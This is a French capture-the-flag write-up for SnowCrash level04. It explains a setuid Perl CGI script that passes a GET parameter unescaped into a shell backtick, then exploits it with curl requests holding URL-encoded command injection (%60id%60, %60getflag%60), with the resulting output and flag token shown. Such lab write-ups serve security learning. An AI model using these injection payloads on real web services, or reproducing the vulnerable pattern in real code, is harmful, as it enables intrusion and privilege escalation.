# level04
## Observations
Nous disposons encore une fois d'un excutable dans le home directory, appelé: `level04.pl`.
Comme dans le level précédent, il dispose d'un setuid bit pour l'execution qui executera
ce script en tant qu'utilisateur `flag04` (`ls -l`).
Il s'agit d'un script perl, et nous pas d'un binaire, il est donc lisible en clair.
Nous n'avons pas les droits d'ecriture.

## Analyse du script

```sh
level04@SnowCrash:~$ cat -n level04.pl
     1	#!/usr/bin/perl
     2	# localhost:4747
     3	use CGI qw{param};
     4	print "Content-type: text/html\n\n";
     5	sub x {
     6	  $y = $_[0];
     7	  print `echo $y 2>&1`;
     8	}
     9	x(param("x"));
```

Le _sha-bang_, ligne 1, nous confirme que le binaire sera executé avec l'interpreteur
perl.

La deuxième ligne est un commentaire, elle nous donne un indice sur le port utilisé `4747`.

La troisième ligne, `use CGI qw{param};`, importe la subroutine (fonction perl) `param` de la class `CGI`,
nous permettant de récupéré un paramètre de la méthode HTTP `GET` (voir [ici](http://perl.mines-albi.fr/ModulesFr/CGI.html#obtenir%20la%20valeur%20ou%20les%20valeurs%20d'un%20seul%20param%C3%A8tre%20nomm%C3%A9)).
> **Note**: _CGI_ (Common Gateway Interface), nous permet de mettre en place un serveur HTTP
> basique, on supposera qu'il sera ouvert sur le port 4747 après le run du programme.

La 4e ligne, indique le `Content-Type` (balise http) de la page renvoyé.

De la ligne 5 à 7, nous avons la définition d'une subroutine (mot clef `sub` - Fonction perl).
- Cette subroutine prend un argument `$_[0]` (comme dan les scripts shell les arguments vont de 0 à 9 et
sont stocké dans une liste).
- Cet argument est stocké  dans la variable `$y`
- Enfin à la variable `$y` est utilisé avec echo: `echo $y 2>&1`

La dernière ligne est le point d'entré du programme la subroutine `x` définit précédement est
appelé avec l paramètre `GET`, `x`.

> **Note:** Pour la syntaxe perl, je me suis basé sur le cours [suivant](https://www.perltutorial.org/introduction-to-perl/).
> Pour CGI, sur [ette doc](http://perl.mines-albi.fr/ModulesFr/CGI.html).

On remarque également qu'un serveur est bien lancé après l'interpretation du
programme (`perl level04.pl`).

En effet, la commande:
```sh
curl localhost:4747
```

Ne nous renvoie pas d'erreur.

## Résolution
Ainsi tout comme le level précédent, je cherche à injecter la commande `getflag`
lors de l'interpretation avec l'utilisateur `flag04`, de ce script.

> **Note**: le caractère '\`' peut nous permettre de faire en sorte qu'echo affiche
> le résultat d'une commande et non la commande en tant que telle:
```sh
level04@SnowCrash:~$ echo pwd
pwd
level04@SnowCrash:~$ echo `pwd`
/home/user/level04
```

On essaie, dans un  premier temps de voir si l'on peut injecter du contenu via
la variable `x` d'une requête `GET`:
```sh
level04@SnowCrash:~$ curl localhost:4747?x=hello
hello
```

Essayons maintenant de passe une commande id:

> **Note**: Il faudra encoder le caractère '\`', pour eviter que la commande soit
> interpreter dans l'URL par l'utilisateur courant, `level04`.
> Pour faire cela, on a la synitaxe suivante: `%<hexadecimal_ASCII>`.
> L'ascii en hexa pour le caractère '\`' est 60. On a donc `%60`.

```sh
level04@SnowCrash:~$ curl localhost:4747?x=%60id%60
uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
```

On a donc un serveur HTTP qui tourne bien avec l'utilisateur `flag04`, et qui nous
permet d'injecter du code :)

On injecte la commande `getflag`:
```sh
level04@SnowCrash:~$ curl localhost:4747?x=%60getflag%60
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

J'obtiens le flag et je peux passé au level suivant !
